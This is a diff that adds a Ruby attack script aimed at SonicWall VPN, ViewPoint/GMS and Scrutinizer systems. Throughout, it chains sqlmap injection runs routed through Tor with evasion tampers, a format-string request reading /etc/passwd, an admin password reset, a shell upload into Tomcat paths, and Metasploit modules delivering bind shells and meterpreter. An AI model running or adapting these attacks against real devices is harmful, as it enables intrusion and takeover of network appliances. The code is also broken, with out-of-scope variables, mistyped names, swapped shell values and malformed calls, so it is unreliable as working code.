@@ -1,0 +1,59 @@
+#!/usr/bin/ruby 
+require 'httpclient'
+require 'thread'
+host = ARGV[0]
+puts "remember to add http or https"
+def vpn 
+	s = "'#{host}/prodpage.cfm?CFID=222*&&CategoryID=3*'"
+	puts `sqlmap -u #{host} --tamper likerandomcase --proxy socks4://127.0.0.1:9050 --random-agent` 
+	#./hardware/remote/33010.txt
+	tr = host + "/cgi-bin/welcome/VirtualOffice?err=%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x'cat /etc/passwd'"
+	rq = HTTPClient.get(tr)
+	puts rq.body
+	puts "Input your ip address to start the server for the exploit."
+	lhost = STDIN.gets.chomp 
+	msf =  `msfconsole -x "use exploit/windows/browser/sonicwall_addrouteentry; set SRVHOST #{lhost}; set HTML::base64 2; exploit"`
+	puts msf
+end 
+
+
+def viewpoint 
+	puts "This exploit changes the admin password."
+	puts "Input your desired password"
+	password = STDIN.gets.chomp 
+	vppw = host + "t/sgms/auth?clientHash=765c5e5b571050030b6366666338306466383761376339303932346163656262&clientHash2=03196ba18cffc80df87a7c90924acebb&changePassword=#{password}&user=admin&ctlSGMSDomainId=DMN0000000000000000000000001"
+	vppwr = HTTPClient.get(vpww)
+	puts vppwr.body 
+	puts "this attempts to gain a root shell"
+	vpsurl = host + "/appliance/applianceMainPage?skipSessionCheck=1"
+	lintcpath = "/Tomcat/webapps/appliance/"
+	wintcpath = "\\Tomcat\\webapps\\appliance\\"
+	winshell = "/bin/bash"
+	linshell = "cmd.exe"
+	data = {'Content_Type' => 'multipart/form-data', 'Content' => 'action' => "file_system" ,' task' => "uploadFile", 'searchFolder' => lintcpath, 'uploadFileName' => linshell }
+	vpsr = HTTPClient.post(host, data)
+	windata = {'Content_Type' => 'multipart/form-data', 'Content' => 'action' => "file_system" ,' task' => "uploadFile", 'searchFolder' => wintcpath, 'uploadFileName' => winshell}
+	wvpsr = HTTPClient.post(host, windata)
+	puts winvpsr.body 
+	puts vpsr.body 
+	m = `msfconsole -x "use exploit/multi/http/sonicwall_gms_upload; set RHOST #{host}; set LPORT 3010; set PAYLOAD java/meterpreter/bind_tcp; exploit "`
+	puts m 
+	
+end 	
+
+def scrutinizer 
+	msf = `msfconsole -x "exploit/windows/http/sonicwall_scrutinizer_sqli; set RHOST #{host}; set  HTTP::header_folding true; set  HTTP::method_random_case true; set HTTP::pad_fake_headers true; set  HTTP::pad_get_params true; set PAYLOAD generic/shell_bind_tcp; exploit"`
+	puts msf 
+	sqlt = "'#{host}/cgi-bin/fa_web.cgi?gadget=applicationsbytes-1*&orderby=1&cachebreaker=23_52_5_814-1%'"
+	sqlr = `sqlmap -u #{sqlt} --tamper likerandomcase --proxy socks4://127.0.0.1:9050 --random-agent`
+	puts sqlr 
+	str = "'#{host}/fa_web.cgi?gadget=applicationsbytes&orderby=-1*&cachebreaker=23_52_5_814-1%27'"
+	smr = `sqlmap -u #{str} --tamper likerandomcase --proxy socks4://127.0.0.1:9050 --tamper equaltolike`
+	puts smr
+	purl = host + "/d4d/uploader.php"	
+	#./php/webapps/37548.txt
+	
+	purr = HTTPClient.get()
+	
+end  
+
